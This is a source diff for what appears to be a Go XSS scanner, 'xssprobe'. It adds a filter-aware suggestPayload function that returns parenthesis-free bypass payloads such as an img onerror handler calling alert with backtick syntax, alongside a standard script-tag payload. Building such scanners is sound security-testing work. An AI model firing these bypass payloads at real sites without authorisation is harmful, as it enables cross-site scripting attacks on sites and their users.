@@ -12,9 +12,28 @@ import (
 	"github.com/Meco30701X/xssprobe/verifier"
 )
 
-// suggestPayload returns a concrete payload suggestion based on the sink type
-func suggestPayload(sinkFunc string) string {
+// suggestPayload returns a concrete payload suggestion based on the sink type and filtering
+func suggestPayload(sinkFunc, filterType string) string {
 	lower := strings.ToLower(sinkFunc)
+	filterLower := strings.ToLower(filterType)
+
+	// If parentheses are filtered, use bypass payloads
+	if strings.Contains(filterLower, "parentheses") || strings.Contains(filterLower, "()") {
+		switch {
+		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
+			return `<img src=x onerror=alert` + "`" + `1` + "`" + `>`
+		case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
+			return `<img src=x onerror=alert` + "`" + `1` + "`" + `>`
+		case strings.Contains(lower, "eval") || strings.Contains(lower, "function(") || strings.Contains(lower, "new function"):
+			return `alert` + "`" + `1` + "`"
+		case strings.Contains(lower, "settimeout") || strings.Contains(lower, "setinterval"):
+			return `alert` + "`" + `1` + "`"
+		default:
+			return `<img src=x onerror=alert` + "`" + `1` + "`" + `>`
+		}
+	}
+
+	// Standard payloads
 	switch {
 	case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
 		return `<script>alert(1)</script>`
@@ -97,7 +116,7 @@ func PrintFindings(findings []scanner.Finding, sourceURL string, pageURL ...stri
 		}
 
 		// Show actionable injection details based on source type
-		payload := suggestPayload(f.Sink)
+		payload := suggestPayload(f.Sink, f.FilterType)
 		printInjectionDetails(f.Source, payload, targetPage)
 
 		fmt.Println()
